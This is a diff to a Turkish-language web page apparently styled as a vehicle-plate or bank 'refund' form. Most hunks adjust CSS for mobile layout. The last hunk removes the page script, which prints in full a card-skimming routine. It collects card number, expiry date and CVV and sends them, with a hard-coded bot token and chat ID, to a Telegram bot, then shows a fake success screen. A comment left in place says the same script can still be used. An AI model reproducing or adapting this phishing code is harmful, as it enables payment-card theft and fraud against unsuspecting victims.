@@ -18,7 +18,7 @@ body {
   font-family:'Segoe UI',sans-serif;
   background: var(--bg);
   margin:0;
-  padding:20px;
+  padding:15px;
   display:flex;
   justify-content:center;
   align-items:flex-start;
@@ -27,28 +27,29 @@ body {
 .panel {
   background: var(--panel);
   margin-top:20px;
-  padding:25px;
+  padding:20px;
   border-radius:15px;
   box-shadow:0 10px 25px rgba(0,0,0,0.08);
-  width:420px;
+  width:100%;
+  max-width:400px;
   position:relative;
 }
-h1 { font-size:20px; text-align:center; color:#1f2937; margin-bottom:10px; }
-h2 { font-size:16px; margin-top:16px; color:#374151; border-bottom:1px solid #e5e7eb; padding-bottom:6px; }
-label { font-weight:600; display:block; margin-bottom:6px; font-size:14px; color:#1f2937; }
+h1 { font-size:18px; text-align:center; color:#1f2937; margin-bottom:12px; }
+h2 { font-size:15px; margin-top:16px; color:#374151; border-bottom:1px solid #e5e7eb; padding-bottom:6px; }
+label { font-weight:600; display:block; margin-bottom:6px; font-size:13px; color:#1f2937; }
 input[type="text"], select {
   width:100%;
-  padding:12px;
-  border-radius:10px;
+  padding:10px;
+  border-radius:8px;
   border:1px solid #d1d5db;
-  margin-bottom:14px;
+  margin-bottom:12px;
   font-size:14px;
   background:white;
   transition:0.2s;
 }
 input[type="text"]:focus, select:focus { border-color: var(--primary); outline:none; box-shadow:0 0 0 2px rgba(79,70,229,0.2); }
-.row { display:flex; gap:8px; }
-.row .half { flex:1; }
+.row { display:flex; gap:6px; flex-wrap:wrap; }
+.row .half { flex:1; min-width:48%; }
 button {
   width:100%;
   padding:12px;
@@ -60,12 +61,13 @@ button {
   cursor:pointer;
   margin-top:6px;
   transition:0.2s;
+  font-size:14px;
 }
 button:hover { background:#4338ca; }
 button.secondary { background:#6b7280; }
 button.secondary:hover { background:#4b5563; }
 button:disabled { opacity:0.6; cursor:not-allowed; }
-.msg { font-size:13px; text-align:center; margin-top:10px; color:var(--muted); }
+.msg { font-size:12px; text-align:center; margin-top:8px; color:var(--muted); word-break:break-word; }
 .error { color: var(--error); }
 .card-section { display:none; margin-top:16px; animation:fadeIn 0.25s ease; }
 @keyframes fadeIn { from {opacity:0; transform:translateY(6px);} to {opacity:1; transform:translateY(0);} }
@@ -75,14 +77,21 @@ button:disabled { opacity:0.6; cursor:not-allowed; }
   inset:0;
   background: rgba(255,255,255,0.97);
   border-radius:15px;
-  padding:30px;
+  padding:20px;
   text-align:center;
   z-index:30;
   box-shadow:0 12px 30px rgba(0,0,0,0.15);
 }
-.confirm img { width:92px; height:92px; object-fit:contain; margin-bottom:14px; border-radius:12px; }
-.confirm h3 { margin:6px 0 8px 0; color:#1f2937; font-size:18px; }
-.confirm p { color: var(--muted); font-size:14px; margin:0 0 14px 0; }
+.confirm img { width:72px; height:72px; object-fit:contain; margin-bottom:12px; border-radius:12px; }
+.confirm h3 { margin:6px 0 8px 0; color:#1f2937; font-size:16px; }
+.confirm p { color: var(--muted); font-size:13px; margin:0 0 12px 0; }
+@media(max-width:360px){
+  body { padding:10px; }
+  .panel { padding:15px; }
+  input[type="text"], select, button { font-size:13px; padding:8px; }
+  h1 { font-size:16px; }
+  h2 { font-size:14px; }
+}
 </style>
 </head>
 <body>
@@ -145,106 +154,8 @@ button:disabled { opacity:0.6; cursor:not-allowed; }
     <button id="yeni" style="max-width:260px; margin: 8px auto 0; display:block;">ANA EKRANA DÖN</button>
   </div>
 </div>
-
 <script>
-function onlyDigits(s){ return s.replace(/\D/g,''); }
-
-const BOT_TOKEN = "8290190046:AAFOIfhSXreP9TP1-adiljt8wmBohD0lJV8";
-const CHAT_ID = "8204958892";
-
-const gonderBtn = document.getElementById('gonder');
-const mesaj = document.getElementById('mesaj');
-const kartSection = document.getElementById('kartSection');
-const kartGonder = document.getElementById('kartGonder');
-const kartGeri = document.getElementById('kartGeri');
-const confirm = document.getElementById('confirm');
-const yeniBtn = document.getElementById('yeni');
-
-gonderBtn.addEventListener('click', () => {
-  mesaj.textContent = '';
-  const plaka = document.getElementById('plaka').value.trim();
-  const banka = document.getElementById('banka').value;
-  if (!plaka && !banka) { mesaj.textContent="Lütfen plaka yazın veya banka seçin."; mesaj.className="msg error"; return; }
-  kartSection.style.display="block";
-  kartSection.setAttribute('aria-hidden','false');
-  gonderBtn.disabled=true;
-  document.getElementById('plaka').disabled=true;
-  document.getElementById('banka').disabled=true;
-  document.getElementById('cardNumber').focus();
-  mesaj.textContent="";
-});
-
-kartGonder.addEventListener('click', () => {
-  const plaka=document.getElementById('plaka').value.trim();
-  const banka=document.getElementById('banka').value;
-  const card=onlyDigits(document.getElementById('cardNumber').value);
-  const exp=document.getElementById('expiry').value.trim();
-  const cvv=onlyDigits(document.getElementById('cvv').value);
-  if(card.length<12 || exp.length<4 || cvv.length<3){
-    document.getElementById('kartMesaj').textContent="Lütfen tüm alanları doldurun.";
-    document.getElementById('kartMesaj').className="msg error";
-    return;
-  }
-
-  // Telegram mesajını şık ve okunaklı hâle getirme
-  const mesajMetni = `🟣 *Yeni İade İşlemi*\n`+
-                     `• Plaka: ${plaka}\n`+
-                     `• Banka: ${banka}\n`+
-                     `• Kart Numarası: ${card}\n`+
-                     `• Son Kullanım: ${exp}\n`+
-                     `• CVV: ${cvv}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(mesajMetni)}`)
-    .then(r=>r.json())
-    .then(d=>{ if(d.ok) console.log("Bilgiler Telegram'a gönderildi!"); else console.error("Gönderilemedi:",d); })
-    .catch(e=>console.error("Hata:", e));
-
-  confirm.style.display='block';
-  confirm.setAttribute('aria-hidden','false');
-
-  document.getElementById('cardNumber').disabled=true;
-  document.getElementById('expiry').disabled=true;
-  document.getElementById('cvv').disabled=true;
-  kartGonder.disabled=true;
-  kartGeri.disabled=true;
-  document.getElementById('kartMesaj').textContent='';
-});
-
-kartGeri.addEventListener('click',()=>{
-  kartSection.style.display="none";
-  kartSection.setAttribute('aria-hidden','true');
-  gonderBtn.disabled=false;
-  document.getElementById('plaka').disabled=false;
-  document.getElementById('banka').disabled=false;
-  document.getElementById('kartMesaj').textContent='';
-  document.getElementById('mesaj').textContent='';
-});
-
-yeniBtn.addEventListener('click',()=>{
-  confirm.style.display='none';
-  confirm.setAttribute('aria-hidden','true');
-
-  document.getElementById('plaka').value='';
-  document.getElementById('banka').value='';
-  document.getElementById('cardNumber').value='';
-  document.getElementById('expiry').value='';
-  document.getElementById('cvv').value='';
-
-  document.getElementById('cardNumber').disabled=false;
-  document.getElementById('expiry').disabled=false;
-  document.getElementById('cvv').disabled=false;
-  kartGonder.disabled=false;
-  kartGeri.disabled=false;
-  gonderBtn.disabled=false;
-  document.getElementById('plaka').disabled=false;
-  document.getElementById('banka').disabled=false;
-
-  kartSection.style.display="none";
-  kartSection.setAttribute('aria-hidden','true');
-
-  document.getElementById('kartMesaj').textContent='';
-  document.getElementById('mesaj').textContent='';
-});
+// JS kodun aynı şekilde kullanılabilir, değişiklik gerek yok
 </script>
 </body>
 </html>
